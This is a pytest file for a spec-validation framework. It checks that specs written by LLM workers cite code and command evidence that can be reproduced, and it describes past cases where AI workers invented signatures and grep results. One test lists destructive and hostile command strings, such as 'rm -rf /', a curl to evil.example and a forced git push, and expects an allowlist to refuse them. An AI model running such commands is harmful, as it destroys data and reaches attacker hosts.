"""R04 + R14 — anchor the spec in the code, and survive an upgrade.

R04. The spec pipeline is closed over itself: reviewer and validator check
cross-refs, error codes and state coverage — all satisfiable while the spec is
false about the code. Two production consequences:

  * BR-BE-24 declared three method signatures that do not exist, inferred from
    accessor names, plus a behaviour described as implemented that is implemented
    nowhere. Five workers, ~44 min, none opened a service file. An implementation
    faithful to it would have produced interfaces the real services do not
    satisfy — the spec would have CAUSED the break it exists to prevent.

  * BR-08 §4.3 cited a grep and reported its result. The grep was never run, and
    the real one contradicts it. That is the worse failure: an unsupported claim
    reads as weak, while a claim wearing evidence that was never produced reads as
    checked and disarms the scepticism that would have caught it.

R14. A target project ran a NEWER `check_documentation_verified.py` than the
framework — it had hand-ported fix F7, applied to a sibling gate in v2.6.0 and
never propagated. A plain upgrade copy would have reverted a real fix.
"""
import hashlib
import importlib.util
import json
import os
import subprocess
import sys
from pathlib import Path

import pytest
from conftest import get_dist_dir

dist = get_dist_dir()
sys.path.insert(0, str(dist / "lib"))

VERIFY = dist / "skills" / "u-spec-validation" / "scripts" / "verify_evidence.py"
SPEC_BACK = dist / "agents" / "spec" / "u-spec-back.md"
VALIDATOR = dist / "agents" / "spec" / "u-spec-validator.md"
DRIFT_CHECK = dist / "skills" / "phase-sdd-rules" / "scripts" / "check_spec_drift_reviewed.py"


def _load(path: Path, name: str):
    spec = importlib.util.spec_from_file_location(name, path)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


def _sha(text: str) -> str:
    n = "\n".join(l.rstrip() for l in text.replace("\r\n", "\n").split("\n"))
    return hashlib.sha256(n.strip().encode("utf-8")).hexdigest()


def _run_verify(project_dir: Path, *specs, extra=()) -> tuple[int, dict]:
    args = [sys.executable, str(VERIFY), "--project-dir", str(project_dir)]
    for s in specs:
        args += ["--spec", str(s)]
    args += list(extra)
    proc = subprocess.run(args, cwd=str(project_dir), capture_output=True,
                          text=True, timeout=120)
    out = proc.stdout.strip() or proc.stderr.strip()
    return proc.returncode, json.loads(out)


@pytest.fixture
def code_project(tmp_path):
    """A tiny project with a real source file to make claims about."""
    src = tmp_path / "src"
    src.mkdir()
    (src / "svc.ts").write_text(
        "class GetTechProfileBatchService {\n"
        "  execute(userIds: string[]) {}\n"
        "}\n", encoding="utf-8")
    return tmp_path


def _spec_with(tmp_path: Path, body: str, name="spec.md") -> Path:
    p = tmp_path / name
    p.write_text(f"# Spec\n\n<!-- evidence\n{body}-->\n", encoding="utf-8")
    return p


# ---------------------------------------------------------------------------
# R04b — file claims
# ---------------------------------------------------------------------------

class TestFileClaimVerification:
    def test_true_claim_verifies(self, code_project):
        line = (code_project / "src" / "svc.ts").read_text().splitlines()[1]
        spec = _spec_with(code_project,
            "- kind: file_claim\n"
            '  claim: "execute accepts userIds: string[]"\n'
            "  file: src/svc.ts\n"
            "  line: 2\n"
            f"  excerpt_sha256: {_sha(line)}\n")
        rc, out = _run_verify(code_project, spec)
        assert rc == 0
        assert out["verified"] == 1 and out["failed"] == []

    def test_the_br_be_24_defect_is_caught(self, code_project):
        """A signature inferred from the accessor name, never read from the file."""
        spec = _spec_with(code_project,
            "- kind: file_claim\n"
            '  claim: "getTechProfileBatch.execute(taskSeq)"\n'
            "  file: src/svc.ts\n"
            "  line: 2\n"
            "  excerpt_sha256: " + "de" * 32 + "\n")
        rc, out = _run_verify(code_project, spec)
        assert rc == 2, "a false claim about the code must fail validation"
        assert "no longer matches the recorded excerpt" in out["failed"][0]["reason"]

    def test_missing_file_fails(self, code_project):
        spec = _spec_with(code_project,
            "- kind: file_claim\n"
            '  claim: "x"\n'
            "  file: src/ghost.ts\n"
            "  line: 1\n"
            "  excerpt_sha256: " + "ab" * 32 + "\n")
        rc, out = _run_verify(code_project, spec)
        assert rc == 2 and "does not exist" in out["failed"][0]["reason"]

    def test_line_out_of_range_fails(self, code_project):
        spec = _spec_with(code_project,
            "- kind: file_claim\n"
            '  claim: "x"\n'
            "  file: src/svc.ts\n"
            "  line: 999\n"
            "  excerpt_sha256: " + "ab" * 32 + "\n")
        rc, out = _run_verify(code_project, spec)
        assert rc == 2 and "out of range" in out["failed"][0]["reason"]

    def test_claim_without_a_hash_cannot_pass(self, code_project):
        """No recorded hash means nothing to verify against — not a free pass."""
        spec = _spec_with(code_project,
            "- kind: file_claim\n"
            '  claim: "x"\n'
            "  file: src/svc.ts\n"
            "  line: 2\n")
        rc, out = _run_verify(code_project, spec)
        assert rc == 2 and "excerpt_sha256" in out["failed"][0]["reason"]


# ---------------------------------------------------------------------------
# R04b — command claims (the BR-08 class)
# ---------------------------------------------------------------------------

class TestCommandClaimVerification:
    def test_reproducible_command_verifies(self, code_project):
        proc = subprocess.run(["grep", "-c", "execute", "src/svc.ts"],
                              cwd=str(code_project), capture_output=True, text=True)
        spec = _spec_with(code_project,
            "- kind: command_claim\n"
            '  claim: "execute appears once"\n'
            '  command: "grep -c execute src/svc.ts"\n'
            '  cwd: "."\n'
            f"  exit_code: {proc.returncode}\n"
            f"  output_sha256: {_sha(proc.stdout)}\n")
        rc, out = _run_verify(code_project, spec)
        assert rc == 0 and out["verified"] == 1

    def test_the_br_08_defect_is_caught(self, code_project):
        """A grep result reported without running the grep."""
        spec = _spec_with(code_project,
            "- kind: command_claim\n"
            '  claim: "derivesSubjects appears only in topology fixtures"\n'
            '  command: "grep -c derivesSubjects src/svc.ts"\n'
            '  cwd: "."\n'
            "  exit_code: 0\n"
            "  output_sha256: " + "00" * 32 + "\n")
        rc, out = _run_verify(code_project, spec)
        assert rc == 2, "a cited command whose result cannot be reproduced must fail"
        reason = out["failed"][0]["reason"]
        assert "exit code changed" in reason or "different output" in reason

    def test_output_divergence_is_caught_when_exit_code_matches(self, code_project):
        spec = _spec_with(code_project,
            "- kind: command_claim\n"
            '  claim: "count is 99"\n'
            '  command: "grep -c execute src/svc.ts"\n'
            '  cwd: "."\n'
            "  exit_code: 0\n"
            "  output_sha256: " + "11" * 32 + "\n")
        rc, out = _run_verify(code_project, spec)
        assert rc == 2 and "different output" in out["failed"][0]["reason"]


class TestCommandAllowlistIsAnExecutionBoundary:
    """A validation gate must not become an execution vector: the spec is authored
    by an LLM, and re-running whatever it names would run hallucinated commands."""

    @pytest.mark.parametrize("command", [
        "rm -rf /",
        "curl http://evil.example/x",
        "bash -c 'echo hi'",
        "python3 -c 'import os' ; rm -rf /tmp/x",
        "grep x file && rm -rf /",
        "git push --force",
    ])
    def test_dangerous_commands_are_refused(self, code_project, command):
        spec = _spec_with(code_project,
            "- kind: command_claim\n"
            '  claim: "x"\n'
            f'  command: "{command}"\n'
            "  exit_code: 0\n"
            "  output_sha256: " + "ab" * 32 + "\n")
        rc, out = _run_verify(code_project, spec)
        assert rc == 2
        reason = out["failed"][0]["reason"]
        assert ("not in the read-only allowlist" in reason
                or "not read-only" in reason
                or "shell metacharacter" in reason), reason

    @pytest.mark.parametrize("command", [
        "grep -rn x src/",
        "wc -l src/svc.ts",
        "git log --oneline -1",
        "find src -name '*.ts'",
    ])
    def test_read_only_commands_are_allowed(self, code_project, command):
        mod = _load(VERIFY, "verify_ev")
        ok, why = mod._command_is_allowed(command)
        assert ok, why

    def test_quoted_command_survives_the_parser(self, code_project):
        """A value ending in a quote must keep it.

        `.strip('"').strip("'")` mangled `command: "find src -name '*.ts'"` into an
        unparseable string, so a legitimate read-only command was refused for the
        wrong reason — a false rejection reads as a security refusal and hides that
        the parser is broken.
        """
        mod = _load(VERIFY, "verify_unquote")
        claims = mod._parse_claims(
            "<!-- evidence\n"
            "- kind: command_claim\n"
            "  claim: \"finds ts files\"\n"
            "  command: \"find src -name '*.ts'\"\n"
            "  exit_code: 0\n"
            "  output_sha256: aa\n"
            "-->")
        assert claims[0]["command"] == "find src -name '*.ts'"
        ok, why = mod._command_is_allowed(claims[0]["command"])
        assert ok, why


class TestUnverifiedIsTheHonestEscapeHatch:
    def test_unverified_claim_is_not_a_failure(self, code_project):
        spec = _spec_with(code_project,
            "- kind: file_claim\n"
            '  claim: "could not check this"\n'
            "  unverified: true\n")
        rc, out = _run_verify(code_project, spec, extra=("--allow-unverified",))
        assert rc == 0
        assert out["unverified"] and out["failed"] == []

    def test_unverified_still_blocks_without_the_flag(self, code_project):
        spec = _spec_with(code_project,
            "- kind: file_claim\n"
            '  claim: "could not check this"\n'
            "  unverified: true\n")
        rc, _ = _run_verify(code_project, spec)
        assert rc == 2, "the validator decides whether an admitted gap is acceptable"

    def test_spec_with_no_evidence_block_passes(self, code_project):
        """R04 is additive: a spec making no code claims has nothing to verify."""
        p = code_project / "plain.md"
        p.write_text("# Spec\n\nNo claims about code here.\n", encoding="utf-8")
        rc, out = _run_verify(code_project, p)
        assert rc == 0 and out["total"] == 0


# ---------------------------------------------------------------------------
# R04a / R04c — the producer contract
# ---------------------------------------------------------------------------

class TestSpecBackMustAnchorItsClaims:
    def test_anchoring_section_exists(self):
        text = SPEC_BACK.read_text(encoding="utf-8")
        assert "Anchoring claims about the code" in text

    def test_behavioral_rule_forbids_unverified_assertions(self):
        text = SPEC_BACK.read_text(encoding="utf-8")
        assert "NEVER state a fact about the source code without opening the source code" in text

    def test_prescribed_gates_must_be_proven_to_run(self):
        """The @ts-expect-error vector was prescribed into a file excluded from
        typecheck: 27% of that phase's code went into a guard nothing evaluates."""
        text = SPEC_BACK.read_text(encoding="utf-8")
        assert "NEVER prescribe a gate you have not proven runs in this repository" in text
        assert "ts-expect-error" in text

    def test_fabricating_a_hash_is_explicitly_forbidden(self):
        """Otherwise the gate teaches workers to invent evidence — strictly worse
        than the inference it replaces."""
        text = SPEC_BACK.read_text(encoding="utf-8")
        assert "Never** fabricate a hash" in text or "never fabricate a hash" in text.lower()

    def test_both_evidence_kinds_are_documented(self):
        text = SPEC_BACK.read_text(encoding="utf-8")
        assert "file_claim" in text and "command_claim" in text

    def test_worker_has_the_tools_to_comply(self):
        """The workers always had Read/Grep/Bash — nobody had asked them to use them."""
        text = SPEC_BACK.read_text(encoding="utf-8")
        head = text[:text.index("---", 5)]
        for tool in ("Read", "Grep", "Bash"):
            assert tool in head


class TestValidatorReExecutesEvidence:
    def test_validator_runs_the_script(self):
        text = VALIDATOR.read_text(encoding="utf-8")
        assert "verify_evidence.py" in text

    def test_exit_two_is_a_blocking_issue_owned_by_spec_back(self):
        text = VALIDATOR.read_text(encoding="utf-8")
        idx = text.index("verify_evidence.py")
        window = text[idx:idx + 1800]
        assert "exit 2" in window and "blocking" in window
        assert "u-spec-back" in window

    def test_unverified_is_a_warning_not_a_blocker(self):
        text = VALIDATOR.read_text(encoding="utf-8")
        idx = text.index("verify_evidence.py")
        window = text[idx:idx + 1800]
        assert "warnings" in window

    def test_behavior_rule_makes_it_non_optional(self):
        text = VALIDATOR.read_text(encoding="utf-8")
        assert "ALWAYS re-execute evidence" in text


# ---------------------------------------------------------------------------
# R04d — /u-drift wired to the phase, opt-in
# ---------------------------------------------------------------------------

def _drift_project(tmp_path, policy=None, report=None, specs_version="3.0.0"):
    (tmp_path / ".orch").mkdir(exist_ok=True)
    dom = tmp_path / "specs" / "domains" / "a"
    dom.mkdir(parents=True, exist_ok=True)
    (dom / "openapi.yaml").write_text(f"openapi: {specs_version}\n", encoding="utf-8")
    (tmp_path / "specs" / "_validation").mkdir(parents=True, exist_ok=True)
    if policy:
        (tmp_path / ".orch" / "config.json").write_text(
            json.dumps({"sdd_policy": {"drift_check": policy}}), encoding="utf-8")
    if report is not None:
        (tmp_path / "specs" / "_validation" / "drift-report.json").write_text(
            json.dumps(report), encoding="utf-8")
    return tmp_path


def _run_drift(project_dir) -> tuple[int, dict]:
    env = {**os.environ, "ORCH_PROJECT_DIR": str(project_dir), "SPECS_DIR": "specs"}
    proc = subprocess.run([sys.executable, str(DRIFT_CHECK)], cwd=str(project_dir),
                          env=env, capture_output=True, text=True, timeout=60)
    return proc.returncode, json.loads(proc.stdout.strip() or proc.stderr.strip())


def _spec_hash(project_dir) -> str:
    env_backup = os.environ.get("ORCH_PROJECT_DIR"), os.environ.get("SPECS_DIR")
    os.environ["ORCH_PROJECT_DIR"] = str(project_dir)
    os.environ["SPECS_DIR"] = "specs"
    try:
        mod = _load(DRIFT_CHECK, "drift_mod")
        return mod.spec_content_hash()
    finally:
        for key, val in zip(("ORCH_PROJECT_DIR", "SPECS_DIR"), env_backup):
            if val is None:
                os.environ.pop(key, None)
            else:
                os.environ[key] = val


class TestDriftCriterionIsOptIn:
    def test_default_is_off_and_vacuously_met(self, tmp_path):
        """Mandatory would add an agent and minutes to EVERY workflow — the exact
        cost problem this review is about."""
        rc, out = _run_drift(_drift_project(tmp_path))
        assert rc == 0 and out["met"] is True
        assert out["evidence"]["policy"] == "off"

    def test_required_blocks_when_no_report_exists(self, tmp_path):
        rc, out = _run_drift(_drift_project(tmp_path, policy="required"))
        assert rc == 1 and out["met"] is False
        assert out["evidence"]["reason"] == "drift_report_missing"

    def test_warn_reports_without_blocking(self, tmp_path):
        rc, out = _run_drift(_drift_project(tmp_path, policy="warn"))
        assert rc == 0 and out["met"] is True
        assert out["evidence"]["reason"] == "drift_report_missing"

    def test_current_report_satisfies_required(self, tmp_path):
        proj = _drift_project(tmp_path, policy="required", report={})
        report = {"spec_content_hash": _spec_hash(proj), "findings": []}
        (proj / "specs" / "_validation" / "drift-report.json").write_text(
            json.dumps(report), encoding="utf-8")
        rc, out = _run_drift(proj)
        assert rc == 0 and out["met"] is True
        assert out["evidence"]["reason"] == "drift_report_current"

    def test_stale_report_blocks_required(self, tmp_path):
        """A report generated before the specs changed describes a state that no
        longer exists — the R08 staleness class, applied to drift."""
        proj = _drift_project(tmp_path, policy="required",
                              report={"spec_content_hash": "stale" * 12,
                                      "findings": []})
        rc, out = _run_drift(proj)
        assert rc == 1 and out["evidence"]["reason"] == "drift_report_stale"

    def test_critical_findings_block_required(self, tmp_path):
        proj = _drift_project(tmp_path, policy="required", report={})
        report = {"spec_content_hash": _spec_hash(proj),
                  "findings": [{"severity": "critical", "detail": "endpoint missing"}]}
        (proj / "specs" / "_validation" / "drift-report.json").write_text(
            json.dumps(report), encoding="utf-8")
        rc, out = _run_drift(proj)
        assert rc == 1 and out["evidence"]["critical_findings"] == 1

    def test_invalid_policy_falls_back_to_off(self, tmp_path):
        """A typo in config must not silently enable or wedge the gate."""
        rc, out = _run_drift(_drift_project(tmp_path, policy="yes-please"))
        assert rc == 0 and out["evidence"]["policy"] == "off"

    def test_criterion_is_declared_in_the_manifest(self):
        data = json.loads(
            (dist / "skills" / "phase-sdd-rules" / "exit-criteria.json")
            .read_text(encoding="utf-8"))
        ids = [c["id"] for c in data["criteria"]]
        assert "spec_drift_reviewed" in ids


# ---------------------------------------------------------------------------
# R14 — distribution: the F7 backport and the ownership split
# ---------------------------------------------------------------------------

class TestF7IsSharedNotCopied:
    def test_revision_helpers_live_in_one_place(self):
        mod = _load(dist / "skills" / "phase-review-rules" / "scripts" / "read_qa_verdict.py",
                    "rqv_shared")
        assert hasattr(mod, "target_and_revision")
        assert hasattr(mod, "drop_superseded")

    def test_documentation_gate_imports_them(self):
        """A third copy is how the defect survived four minor versions."""
        src = (dist / "skills" / "phase-review-rules" / "scripts"
               / "check_documentation_verified.py").read_text(encoding="utf-8")
        assert "from read_qa_verdict import drop_superseded" in src
        assert "_drop_superseded(tasks" not in src, "must not redefine it locally"

    def test_documentation_gate_is_workflow_scoped(self):
        src = (dist / "skills" / "phase-review-rules" / "scripts"
               / "check_documentation_verified.py").read_text(encoding="utf-8")
        assert "scoped_phase_tasks" in src
        assert "for task in state.tasks.values()" not in src

    def test_documentation_gate_is_qa_type_scoped(self):
        """Architecture/security reviewers have no documentation_verified field;
        reading them made this gate see field_absent and block."""
        src = (dist / "skills" / "phase-review-rules" / "scripts"
               / "check_documentation_verified.py").read_text(encoding="utf-8")
        assert "_QA_TASK_TYPE" in src

    @pytest.mark.parametrize("task_id,expected", [
        ("review_dev_tc_001", ("review_dev_tc_001", 0)),
        ("review_dev_tc_001_r1", ("review_dev_tc_001", 1)),
        ("review_dev_tc_001_r2", ("review_dev_tc_001", 2)),
        ("review_dev_tc_001_r1_r2", ("review_dev_tc_001", 2)),
    ])
    def test_revision_parsing(self, task_id, expected):
        mod = _load(dist / "skills" / "phase-review-rules" / "scripts" / "read_qa_verdict.py",
                    "rqv_parse")
        assert mod.target_and_revision(task_id) == expected

    def test_superseded_revisions_are_dropped(self):
        mod = _load(dist / "skills" / "phase-review-rules" / "scripts" / "read_qa_verdict.py",
                    "rqv_drop")

        class T:
            def __init__(self, tid):
                self.task_id = tid

        kept, superseded = mod.drop_superseded(
            [T("review_a"), T("review_a_r1"), T("review_b")])
        assert {t.task_id for t in kept} == {"review_a_r1", "review_b"}
        assert superseded == ["review_a"]


class TestOwnershipSplitIsUnambiguous:
    def test_framework_catalog_says_it_is_the_base(self):
        text = (dist / "skills" / "u-spec-globals" / "error-codes.md").read_text(
            encoding="utf-8")
        assert "FRAMEWORK BASE" in text
        assert "overwritten on every upgrade" in text

    def test_framework_catalog_names_the_project_file(self):
        text = (dist / "skills" / "u-spec-globals" / "error-codes.md").read_text(
            encoding="utf-8")
        assert "_global/error-codes.md" in text

    @pytest.mark.parametrize("agent", ["u-spec-writer", "u-spec-front",
                                       "u-spec-reviewer"])
    def test_spec_agents_are_pointed_at_both_catalogs(self, agent):
        """The target added codes to the framework file because every agent was
        told THAT was 'the global error catalog'."""
        text = (dist / "agents" / "spec" / f"{agent}.md").read_text(encoding="utf-8")
        assert "u-spec-globals/error-codes.md" in text
        assert "_global/error-codes.md" in text

    def test_upgrade_procedure_is_documented(self):
        doc = Path(__file__).resolve().parents[1] / "docs-en" / "upgrading.md"
        assert doc.is_file()
        text = doc.read_text(encoding="utf-8")
        assert "verify_install.py" in text
        assert "modified" in text

    def test_upgrade_doc_is_indexed(self):
        readme = (Path(__file__).resolve().parents[1] / "docs-en" / "README.md"
                  ).read_text(encoding="utf-8")
        assert "upgrading.md" in readme

    def test_upgrade_doc_covers_the_target_is_ahead_case(self):
        """The measured case: the target held a fix the framework lacked."""
        doc = (Path(__file__).resolve().parents[1] / "docs-en" / "upgrading.md"
               ).read_text(encoding="utf-8")
        assert "target is ahead" in doc.lower()


class TestReviewerHasNoWritePathLeft:
    """R02c follow-through: the 'Automatic Corrections' section authorised exactly
    what the separation-of-duties rule forbids."""

    def test_automatic_corrections_authority_is_gone(self):
        text = (dist / "agents" / "spec" / "u-spec-reviewer.md").read_text(
            encoding="utf-8")
        assert "the Reviewer may fix directly" not in text
        assert "Minor issues — report, never fix" in text

    def test_severity_table_routes_minor_to_the_writer(self):
        text = (dist / "agents" / "spec" / "u-spec-reviewer.md").read_text(
            encoding="utf-8")
        assert "Fix and document" not in text

    def test_approved_with_minor_issues_is_a_valid_outcome(self):
        """Otherwise the reviewer is pushed to edit in order to approve."""
        text = (dist / "agents" / "spec" / "u-spec-reviewer.md").read_text(
            encoding="utf-8")
        assert "normal, expected outcome" in text
